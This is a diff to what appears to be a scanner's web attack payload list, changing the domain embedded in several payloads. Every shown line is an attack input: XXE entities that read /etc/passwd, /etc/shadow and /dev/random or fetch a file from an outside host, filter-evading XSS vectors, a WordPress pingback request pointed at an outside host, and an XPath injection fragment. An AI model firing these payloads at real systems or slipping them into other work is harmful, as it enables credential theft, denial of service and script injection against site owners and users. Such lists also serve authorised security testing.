@@ -25,7 +25,7 @@ x' or name()='username' or 'x'='y
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
 <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
 <xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
 <xml SRC="https://crowdshield.com/.testing/rfi_vuln.txt" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
@@ -47,9 +47,9 @@ x' or name()='username' or 'x'='y
 }}</script>'
 '}}</script>'
 '}}</script>"
-<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>
+<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://sn1persecurity.com</string></value></param></params></methodCall>
 <xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "../../../../../../../etc/passwd">]><methodCall><methodName>&xxe</methodName></methodCall>
-<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
 <xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
 <xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
